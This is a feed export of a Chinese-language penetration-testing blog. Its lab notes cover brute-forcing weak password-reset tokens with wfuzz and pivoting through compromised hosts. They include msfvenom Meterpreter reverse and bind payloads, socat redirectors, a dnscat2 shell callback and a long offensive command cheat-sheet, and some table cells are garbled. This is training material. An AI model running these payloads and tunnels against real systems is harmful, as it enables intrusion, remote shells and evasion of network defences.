此功能允许我们在不知道密码的情况下重置用户的实际密码。</p><h2 id="Reset-Token-by-Email"><a href="#Reset-Token-by-Email" class="headerlink" title="Reset Token by Email"></a>Reset Token by Email</h2><p>如果应用程序允许用户使用URL或通过电子邮件发送的临时密码重置密码，那么它应该包含强大的令牌生成功能。框架通常具有用于此目的的专用功能。然而，开发人员通常会实现自己的功能，这些功能可能会引入逻辑缺陷和弱加密，或者通过模糊实现安全性。</p><h2 id="Weak-Token-Generation"><a href="#Weak-Token-Generation" class="headerlink" title="Weak Token Generation"></a>Weak Token Generation</h2><p>一些应用程序使用已知或可预测的值（如本地时间或请求操作的用户名）创建令牌，然后对值进行散列或编码。这是一种糟糕的安全做法，因为令牌不需要包含来自要验证的实际用户的任何信息，并且应该是一个纯随机值。在可逆编码的情况下，对令牌进行解码以了解它是如何构建的并伪造一个有效的令牌就足够了。<br>作为渗透测试人员，我们应该意识到这些类型的糟糕实现。当为给定用户请求重置令牌时，我们应该尝试使用已知的组合（如时间+用户名或时间+电子邮件）来强制执行任何弱哈希。以这段PHP代码为例。它在逻辑上等同于Apache OpenMeeting上报告的CVE-2016-0783漏洞：</p><pre><code class="php">&lt;?phpfunction generate_reset_token($username) &#123;  $time = intval(microtime(true) * 1000);  $token = md5($username . $time);  return $token;&#125;</code></pre><p>很容易发现漏洞。知道有效用户名的攻击者可以通过读取Date标头（它几乎总是出现在HTTP响应中）来获取服务器时间。然后，攻击者可以在几秒钟内强行执行$time值，并获得有效的重置令牌。在这个例子中，我们可以看到一个常见的请求泄露日期和时间。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061018944.png" alt="img"></p><p>我们可以使用wfuzz。具体来说，我们可以为区分大小写的字符串Valid（–ss“Valid”）使用字符串匹配。当然，如果我们不知道提交有效令牌时web应用程序是如何回复的，我们可以使用“反向匹配”，通过使用–hs “Invalid.”查找不包含无效令牌的任何响应。</p><pre><code class="shell-session">Tanin@htb[/htb]$ wfuzz -z range,00000-99999 --ss &quot;Valid&quot; &quot;https://brokenauthentication.hackthebox.eu/token.php?user=admin&amp;token=FUZZ&quot;</code></pre><p>&lt;待续…&gt;</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Overview-of-Attacks-Against-Authentication&quot;&gt;&lt;a href=&quot;#Overview-of-Attacks-Against-Authentication&quot; class=&quot;headerlink&quot; title=&quot;Overview of Attacks Against Authentication&quot;&gt;&lt;/a&gt;Overview of Attacks Against Authentication&lt;/h1&gt;&lt;p&gt;身份验证攻击总共可以针对三个域进行。这三个领域分为以下几类： &lt;strong&gt;HAS域（拥有的东西）&lt;/strong&gt; &lt;strong&gt;IS域（所知信息）&lt;/strong&gt; &lt;strong&gt;KNOWS域（所知的事情）&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site &amp;Playing Pong with Socat</title>
    <link href="https://taninluv.github.io/2023/08/30/Pivoting-Tunneling-and-Port-Forwarding-Choosing-The-Dig-Site-Playing-Pong-with-Socat/"/>
    <id>https://taninluv.github.io/2023/08/30/Pivoting-Tunneling-and-Port-Forwarding-Choosing-The-Dig-Site-Playing-Pong-with-Socat/</id>
    <published>2023-08-30T02:43:05.000Z</published>
    <updated>2023-09-22T13:07:17.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Socat-Redirection-with-a-Reverse-Shell"><a href="#Socat-Redirection-with-a-Reverse-Shell" class="headerlink" title="Socat Redirection with a Reverse Shell"></a>Socat Redirection with a Reverse Shell</h1><p><a href="https://linux.die.net/man/1/socat">Socat</a>是一个双向中继工具，可以在2个独立的网络通道之间创建管道套接字，而无需使用SSH隧道。它充当了一个重定向器，可以监听一个主机和端口，并将数据转发到另一个IP地址和端口。我们可以使用上一节中提到的攻击主机上的相同命令启动Metasploit的侦听器，我们也可以在Ubuntu服务器上启动socat。</p><h4 id="Starting-Socat-Listener"><a href="#Starting-Socat-Listener" class="headerlink" title="Starting Socat Listener"></a>Starting Socat Listener</h4><pre><code class="shell-session">ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80</code></pre><p>Socat将在8080端口的localhost上侦听，并将所有流量转发到我们的攻击主机（10.10.14.18）上的80端口。一旦配置了我们的重定向器，我们就可以创建一个有效负载，该负载将连接回在Ubuntu服务器上运行的重定向器。我们还将在攻击主机上启动一个侦听器，因为一旦socat接收到来自目标的连接，它就会将所有流量重定向到攻击主机的侦听器，在那里我们将获得一个shell。</p><h4 id="Creating-the-Windows-Payload"><a href="#Creating-the-Windows-Payload" class="headerlink" title="Creating the Windows Payload"></a>Creating the Windows Payload</h4><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080</code></pre><h4 id="Configuring-amp-Starting-the-multi-x2F-handler"><a href="#Configuring-amp-Starting-the-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting the multi&#x2F;handler"></a>Configuring &amp; Starting the multi&#x2F;handler</h4><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_httpspayload =&gt; windows/x64/meterpreter/reverse_httpsmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0lhost =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; set lport 80lport =&gt; 80msf6 exploit(multi/handler) &gt; run</code></pre><h1 id="Socat-Redirection-with-a-Bind-Shell"><a href="#Socat-Redirection-with-a-Bind-Shell" class="headerlink" title="Socat Redirection with a Bind Shell"></a>Socat Redirection with a Bind Shell</h1><p>类似于我们的socat的反向shell重定向器，我们也可以创建一个socat绑定shell重定向器。这与从Windows服务器连接回Ubuntu服务器并重定向到我们的攻击主机的反向shell不同。在绑定shell的情况下，Windows服务器将启动一个侦听器并绑定到一个特定的端口。我们可以为Windows创建一个绑定shell负载，并在Windows主机上执行它。同时，我们可以在Ubuntu服务器上创建一个socat重定向器，它将侦听来自Metasploit绑定处理程序的传入连接，并将其转发到Windows目标上的绑定shell负载。下图应该可以更好地解释枢轴。</p><p><img src="https://academy.hackthebox.com/storage/modules/158/55.png" alt="img"></p><p>我们可以通过以下命令使用msfvenom创建绑定shell。</p><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 499 bytesFinal size of exe file: 7168 bytesSaved as: backupjob.exe</code></pre><p>我们可以启动一个socat绑定shell侦听器，它在端口8080上侦听并将数据包转发到Windows服务器8443。</p><pre><code class="shell-session">ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443</code></pre><p>最后，我们可以启动一个Metasploit绑定处理程序。这个绑定处理程序可以配置为连接到端口8080（Ubuntu服务器）上的socat侦听器</p><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcppayload =&gt; windows/x64/meterpreter/bind_tcpmsf6 exploit(multi/handler) &gt; set RHOST 10.129.202.64RHOST =&gt; 10.129.202.64msf6 exploit(multi/handler) &gt; set LPORT 8080LPORT =&gt; 8080msf6 exploit(multi/handler) &gt; run[*] Started bind TCP handler against 10.129.202.64:8080</code></pre><p>我们可以看到，在Windows目标上执行有效负载时，绑定处理程序通过socat侦听器连接到阶段请求。</p><pre><code class="shell-session">[*] Sending stage (200262 bytes) to 10.129.202.64[*] Meterpreter session 1 opened (10.10.14.18:46253 -&gt; 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500meterpreter &gt; getuidServer username: INLANEFREIGHT\victor</code></pre><h1 id="socat基本用法："><a href="#socat基本用法：" class="headerlink" title="socat基本用法："></a>socat基本用法：</h1><p><code>socat</code> 是一个非常灵活的工具，可以用于许多不同的用途。以下是一些常见的 <code>socat</code> 命令示例，演示了一些常见的用法：</p><ol><li><p><strong>创建端口转发：</strong></p><pre><code>socat TCP-LISTEN:8080,fork TCP:目标IP:80</code></pre><p>在本地监听端口 8080，并将流量转发到目标 IP 地址的 80 端口。</p></li><li><p><strong>创建代理服务器：</strong></p><pre><code>socat TCP-LISTEN:8888,fork TCP:目标IP:80</code></pre><p>在本地监听端口 8888，将流量作为代理转发到目标 IP 地址的 80 端口。</p></li><li><p><strong>加密连接：</strong></p><pre><code>socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork OPENSSL:目标IP:8443</code></pre><p>在本地监听端口 443，使用 SSL 加密，将数据转发到目标 IP 地址的 8443 端口。</p></li><li><p><strong>创建虚拟串口：</strong></p><pre><code>socat PTY,link=/dev/ttyS0 PTY,link=/dev/ttyS1</code></pre><p>创建两个虚拟串口设备 <code>/dev/ttyS0</code> 和 <code>/dev/ttyS1</code>，将数据从一个串口转发到另一个串口。</p></li><li><p><strong>文件传输：</strong></p><pre><code>socat FILE:source.txt TCP-LISTEN:8080</code></pre><p>将文件 <code>source.txt</code> 的内容通过 TCP 在本地监听端口 8080 上传输。</p></li><li><p><strong>执行 Shell 命令：</strong></p><pre><code>socat SYSTEM:&#39;ls -l&#39;,pty,stderr TCP-LISTEN:8080</code></pre><p>在本地监听端口 8080，执行 <code>ls -l</code> 命令并将输出传输到连接。</p></li></ol><p>这些示例只是 <code>socat</code> 的一小部分用法，它有很多其他功能和选项，可以根据不同的需求进行调整。在使用 <code>socat</code> 时，应该查阅官方文档以了解更多详细信息和用法示例。</p><h1 id="本节备忘录："><a href="#本节备忘录：" class="headerlink" title="本节备忘录："></a>本节备忘录：</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>ifconfig</code></td><td>Linux-based command that displays all current network configurations of a system.</td></tr><tr><td><code>ipconfig</code></td><td>Windows-based command that displays all system network configurations.</td></tr><tr><td><code>netstat -r</code></td><td>Command used to display the routing table for all IPv4-based protocols.</td></tr><tr><td><code>nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code></td><td>Nmap command used to scan a target for open ports allowing SSH or MySQL connections.</td></tr><tr><td><code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH comand used to create an SSH tunnel from a local machine on local port <code>1234</code> to a remote target using port 3306.</td></tr><tr><td>&#96;netstat -antp</td><td>grep 1234&#96;</td></tr><tr><td><code>nmap -v -sV -p1234 localhost</code></td><td>Nmap command used to scan a host through a connection that has been made on local port <code>1234</code>.</td></tr><tr><td><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH command that instructs the ssh client to request the SSH server forward all data via port <code>1234</code> to <code>localhost:3306</code>.</td></tr><tr><td><code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH command used to perform a dynamic port forward on port <code>9050</code> and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.</td></tr><tr><td><code>tail -4 /etc/proxychains.conf</code></td><td>Linux-based command used to display the last 4 lines of &#x2F;etc&#x2F;proxychains.conf. Can be used to ensure socks configurations are in place.</td></tr><tr><td><code>proxychains nmap -v -sn 172.16.5.1-200</code></td><td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range <code>172.16.5.1-200</code> with increased verbosity (<code>-v</code>) disabling ping scan (<code>-sn</code>).</td></tr><tr><td><code>proxychains nmap -v -Pn -sT 172.16.5.19</code></td><td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (<code>-v</code>), disabling ping discover (<code>-Pn</code>), and using TCP connect scan type (<code>-sT</code>).</td></tr><tr><td><code>proxychains msfconsole</code></td><td>Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.</td></tr><tr><td><code>msf6 &gt; search rdp_scanner</code></td><td>Metasploit search that attempts to find a module called <code>rdp_scanner</code>.</td></tr><tr><td><code>proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</code></td><td>Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></td><td>Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following <code>lhost=</code> on local port 8080 (<code>LPORT=8080</code>). Payload will take the form of an executable file called <code>backupscript.exe</code>.</td></tr><tr><td><code>msf6 &gt; use exploit/multi/handler</code></td><td>Used to select the multi-handler exploit module in Metasploit.</td></tr><tr><td><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></td><td>Uses secure copy protocol (<code>scp</code>) to transfer the file <code>backupscript.exe</code> to the specified host and places it in the Ubuntu user’s home directory (<code>:~/</code>).</td></tr><tr><td><code>python3 -m http.server 8123</code></td><td>Uses Python3 to start a simple HTTP server listening on port<code> 8123</code>. Can be used to retrieve files from a host.</td></tr><tr><td><code>Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></td><td>PowerShell command used to download a file called backupscript.exe from a webserver (<code>172.16.5.129:8123</code>) and then save the file to location specified after <code>-OutFile</code>.</td></tr><tr><td><code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></td><td>SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port <code>8080</code> on the attack host to port <code>80</code> on the target.</td></tr><tr><td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code></td><td>Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after <code>LHOST=</code> on port 8080 (<code>LPORT=8080</code>). Payload takes the form of an executable elf file called backupjob.</td></tr><tr><td><code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></td><td>Metasploit command that runs a ping sweep module against the specified network segment (<code>RHOSTS=172.16.5.0/23</code>).</td></tr><tr><td></td><td></td></tr><tr><td>&#96;for i in {1..254} ;do (ping -c 1 172.16.5.$i</td><td>grep “bytes from” &amp;) ;done&#96;</td></tr><tr><td>&#96;for &#x2F;L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100</td><td>find “Reply”&#96;</td></tr><tr><td>&#96;1..254</td><td>% {“172.16.5.$($<em>): $(Test-Connection -count 1 -comp 172.15.5.$($</em>) -quiet)”}&#96;</td></tr><tr><td><code>msf6 &gt; use auxiliary/server/socks_proxy</code></td><td>Metasploit command that selects the <code>socks_proxy</code> auxiliary module.</td></tr><tr><td><code>msf6 auxiliary(server/socks_proxy) &gt; jobs</code></td><td>Metasploit command that lists all currently running jobs.</td></tr><tr><td><code>socks4 127.0.0.1 9050</code></td><td>Line of text that should be added to &#x2F;etc&#x2F;proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.</td></tr><tr><td><code>Socks5 127.0.0.1 1080</code></td><td>Line of text that should be added to &#x2F;etc&#x2F;proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.</td></tr><tr><td><code>msf6 &gt; use post/multi/manage/autoroute</code></td><td>Metasploit command used to select the autoroute module.</td></tr><tr><td></td><td></td></tr><tr><td><code>meterpreter &gt; help portfwd</code></td><td>xxxxxxxxxx11 1[<em>] Started reverse TCP handler on 0.0.0.0:8081 2[</em>] Sending stage (200262 bytes) to 10.10.14.183[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -05004​5meterpreter &gt; shell6Process 2336 created.7Channel 1 created.8Microsoft Windows [Version 10.0.17763.1637]9(c) 2018 Microsoft Corporation. All rights reserved.10​11C:&gt;shell-session</td></tr><tr><td><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code></td><td>Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.</td></tr><tr><td><code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></td><td>Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.</td></tr><tr><td><code>netstat -antp</code></td><td>Used to display all (<code>-a</code>) active network connections with associated process IDs. <code>-t</code> displays only TCP connections.<code>-n</code> displays only numerical addresses. <code>-p</code> displays process IDs associated with each displayed connection.</td></tr><tr><td><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code></td><td>Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port <code>1234</code> listening on the IP address of the Attack Host.</td></tr><tr><td><code>meterpreter &gt; bg</code></td><td>Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux</td></tr><tr><td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code></td><td>Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.</td></tr><tr><td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code></td><td>Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.</td></tr><tr><td><code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>Windows-based command that uses PuTTY’s Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.</td></tr><tr><td><code>sudo apt-get install sshuttle</code></td><td>Uses apt-get to install the tool sshuttle.</td></tr><tr><td><code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</code></td><td>Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (<code>172.16.5.0</code>).</td></tr><tr><td><code>sudo git clone https://github.com/klsecservices/rpivot.git</code></td><td>Clones the rpivot project GitHub repository.</td></tr><tr><td><code>sudo apt-get install python2.7</code></td><td>Uses apt-get to install python2.7.</td></tr><tr><td><code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></td><td>Used to run the rpivot server (<code>server.py</code>) on proxy port <code>9050</code>, server port <code>9999</code> and listening on any IP address (<code>0.0.0.0</code>).</td></tr><tr><td><code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code></td><td>Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.</td></tr><tr><td><code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></td><td>Used to run the rpivot client (<code>client.py</code>) to connect to the specified rpivot server on the appropriate port.</td></tr><tr><td><code>proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code></td><td>Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.</td></tr><tr><td><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></td><td>Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.</td></tr><tr><td><code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code></td><td>Windows-based command that uses <code>netsh.exe</code> to configure a portproxy rule called <code>v4tov4</code> that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.</td></tr><tr><td><code>netsh.exe interface portproxy show v4tov4</code></td><td>Windows-based command used to view the configurations of a portproxy rule called v4tov4.</td></tr><tr><td><code>git clone https://github.com/iagox86/dnscat2.git</code></td><td>Clones the <code>dnscat2</code> project GitHub repository.</td></tr><tr><td><code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></td><td>Used to start the dnscat2.rb server running on the specified IP address, port (<code>53</code>) &amp; using the domain <code>inlanefreight.local</code> with the no-cache option enabled.</td></tr><tr><td><code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></td><td>Clones the dnscat2-powershell project Github repository.</td></tr><tr><td><code>Import-Module dnscat2.ps1</code></td><td>PowerShell command used to import the dnscat2.ps1 tool.</td></tr><tr><td><code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></td><td>PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (<code>-Exec cmd</code>).</td></tr><tr><td><code>dnscat2&gt; ?</code></td><td>Used to list dnscat2 options.</td></tr><tr><td><code>dnscat2&gt; window -i 1</code></td><td>Used to interact with an established dnscat2 session.</td></tr><tr><td><code>./chisel server -v -p 1234 --socks5</code></td><td>Used to start a chisel server in verbose mode listening on port <code>1234</code> using SOCKS version 5.</td></tr><tr><td><code>./chisel client -v 10.129.202.64:1234 socks</code></td><td>Used to connect to a chisel server at the specified IP address &amp; port using socks.</td></tr><tr><td><code>git clone https://github.com/utoni/ptunnel-ng.git</code></td><td>Clones the ptunnel-ng project GitHub repository.</td></tr><tr><td><code>sudo ./autogen.sh</code></td><td>Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.</td></tr><tr><td><code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></td><td>Used to start the ptunnel-ng server on the specified IP address (<code>-r</code>) and corresponding port (<code>-R22</code>).</td></tr><tr><td><code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></td><td>Used to connect to a specified ptunnel-ng server through local port 2222 (<code>-l2222</code>).</td></tr><tr><td><code>ssh -p2222 -lubuntu 127.0.0.1</code></td><td>SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.</td></tr><tr><td><code>regsvr32.exe SocksOverRDP-Plugin.dll</code></td><td>Windows-based command used to register the SocksOverRDP-PLugin.dll.</td></tr><tr><td>&#96;netstat -antb</td><td>findstr 1080&#96;</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Socat-Redirection-with-a-Reverse-Shell&quot;&gt;&lt;a href=&quot;#Socat-Redirection-with-a-Reverse-Shell&quot; class=&quot;headerlink&quot; title=&quot;Socat Redirectio</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site &amp; Starting Our Tunnels</title>
    <link href="https://taninluv.github.io/2023/08/27/Pivoting-Tunneling-and-Port-Forwarding/"/>
    <id>https://taninluv.github.io/2023/08/27/Pivoting-Tunneling-and-Port-Forwarding/</id>
    <published>2023-08-27T08:25:27.000Z</published>
    <updated>2023-08-29T11:48:29.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction-to-Pivoting-Tunneling-and-Port-Forwarding"><a href="#Introduction-to-Pivoting-Tunneling-and-Port-Forwarding" class="headerlink" title="Introduction to Pivoting, Tunneling, and Port Forwarding"></a>Introduction to Pivoting, Tunneling, and Port Forwarding</h1><p><img src="https://academy.hackthebox.com/storage/modules/158/PivotingandTunnelingVisualized.gif" alt="img"></p><p>在红队参与、渗透测试或Active Directory评估期间，我们经常会发现自己可能已经泄露了移动到另一台主机所需的凭据、ssh密钥、哈希或访问令牌，但可能没有其他主机可以从我们的攻击主机直接访问。在这种情况下，我们可能需要使用一个我们已经妥协的枢轴主机来找到通往下一个目标的方法。第一次登录主机时，最重要的事情之一是检查我们的权限级别、网络连接以及潜在的VPN或其他远程访问软件。如果一台主机有多个网络适配器，我们可能会使用它来移动到不同的网段。Pivoting本质上是指通过受损的主机转移到其他网络，在不同的网段上找到更多目标。</p><span id="more"></span><p>有许多不同的术语用于描述受损主机，我们可以使用这些术语来转向以前无法访问的网段。最常见的有：</p><ul><li><code>Pivot Host</code></li><li><code>Proxy</code></li><li><code>Foothold</code></li><li><code>Beach Head system</code></li><li><code>Jump Host</code></li></ul><p>Pivoting的主要用途是击败分段（物理和虚拟）来访问孤立的网络。另一方面，隧道是枢转的一个子集。隧道将网络流量封装到另一个协议中，并通过它路由流量。</p><p>像VPN或专用浏览器这样的典型应用程序只是隧道网络流量的另一种形式。 在IT和Infosec行业，我们不可避免地会遇到几个不同的术语来描述同一件事。通过旋转，我们会注意到这通常被称为横向运动。</p><h2 id="Lateral-Movement-Pivoting-and-Tunneling-Compared"><a href="#Lateral-Movement-Pivoting-and-Tunneling-Compared" class="headerlink" title="Lateral Movement, Pivoting, and Tunneling Compared"></a>Lateral Movement, Pivoting, and Tunneling Compared</h2><h4 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h4><p>横向移动可以被描述为一种用于在网络环境中进一步访问额外主机、应用程序和服务的技术。横向移动还可以帮助我们获得提升特权所需的特定领域资源。横向移动通常允许主机之间的权限升级。除了我们对这一概念的解释外，我们还可以研究其他受人尊敬的组织如何解释横向运动。如果时间允许，请查看以下两种解释：</p><p><a href="https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement">Palo Alto Network’s Explanation</a></p><p><a href="https://attack.mitre.org/tactics/TA0008/">MITRE’s Explanation</a></p><h4 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h4><p>利用多个主机来跨越通常无法访问的网络边界。这是一个更有针对性的目标。这里的目标是通过损害目标主机或基础设施，使我们能够深入网络。</p><h4 id="Tunneling"><a href="#Tunneling" class="headerlink" title="Tunneling"></a>Tunneling</h4><p>我们经常发现自己使用各种协议来将流量穿梭于有可能检测到流量的网络中。例如，使用HTTP来屏蔽从我们拥有的服务器到受害者主机的命令和控制流量。这里的关键是混淆我们的行动，以尽可能长时间地避免被发现。我们使用具有增强安全措施的协议，如TLS上的HTTPS或其他传输协议上的SSH。这些类型的操作还可以实现诸如将数据从目标网络中过滤出来或将更多有效载荷和指令传递到网络中之类的策略。</p><h1 id="The-Networking-Behind-Pivoting"><a href="#The-Networking-Behind-Pivoting" class="headerlink" title="The Networking Behind Pivoting"></a>The Networking Behind Pivoting</h1><h2 id="IP-Addressing-amp-NICs"><a href="#IP-Addressing-amp-NICs" class="headerlink" title="IP Addressing &amp; NICs"></a>IP Addressing &amp; NICs</h2><h2 id="Routing"><a href="#Routing" class="headerlink" title="Routing"></a>Routing</h2><p>路由器的一个关键定义特征是它有一个路由表，用于根据目的地IP地址转发流量。我们在Pwnbox上使用命令netstat-r或ip route来查看这一点。</p><p>被指定为路由器的独立设备通常会使用静态路由创建、动态路由协议和直接连接接口的组合来学习路由。任何去往路由表中不存在的网络的流量都将被发送到默认路由，该路由也可以被称为默认网关或最后的网关。在寻找转向机会时，查看主机的路由表以确定我们可能能够到达的网络或我们可能需要添加的路由可能会很有帮助。</p><h2 id="Protocols-Services-amp-Ports"><a href="#Protocols-Services-amp-Ports" class="headerlink" title="Protocols, Services &amp; Ports"></a>Protocols, Services &amp; Ports</h2><p>可以尝试使用网络绘图工具绘制网络拓扑。当我寻找转向的机会时，我喜欢使用<a href="https://draw.io/">Draw.io</a>等工具来构建我所处网络环境的可视化，它也是一个很好的文档工具</p><h1 id="Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling"><a href="#Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling" class="headerlink" title="Dynamic Port Forwarding with SSH and SOCKS Tunneling"></a>Dynamic Port Forwarding with SSH and SOCKS Tunneling</h1><hr><h2 id="Port-Forwarding-in-Context"><a href="#Port-Forwarding-in-Context" class="headerlink" title="Port Forwarding in Context"></a>Port Forwarding in Context</h2><p>端口转发是一种允许我们将通信请求从一个端口重定向到另一个端口的技术。端口转发使用TCP作为主要通信层，为转发的端口提供交互式通信。然而，可以使用不同的应用层协议，如SSH甚至SOCKS（非应用层）来封装转发的流量。这可以有效绕过防火墙，并使用受损主机上的现有服务转向其他网络。</p><h2 id="SSH-Local-Port-Forwarding"><a href="#SSH-Local-Port-Forwarding" class="headerlink" title="SSH Local Port Forwarding"></a>SSH Local Port Forwarding</h2><p>让我们从下图中举一个例子。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291121798.png" alt="img"></p><p>我们有一个攻击主机（10.10.15.x）和一个目标Ubuntu服务器（10.129.x.x），我们已经破坏了它。我们将使用Nmap扫描目标Ubuntu服务器以搜索打开的端口。</p><h4 id="Scanning-the-Pivot-Target"><a href="#Scanning-the-Pivot-Target" class="headerlink" title="Scanning the Pivot Target"></a>Scanning the Pivot Target</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 ESTNmap scan report for 10.129.202.64Host is up (0.12s latency).PORT     STATE  SERVICE22/tcp   open   ssh3306/tcp closed mysqlNmap done: 1 IP address (1 host up) scanned in 0.68 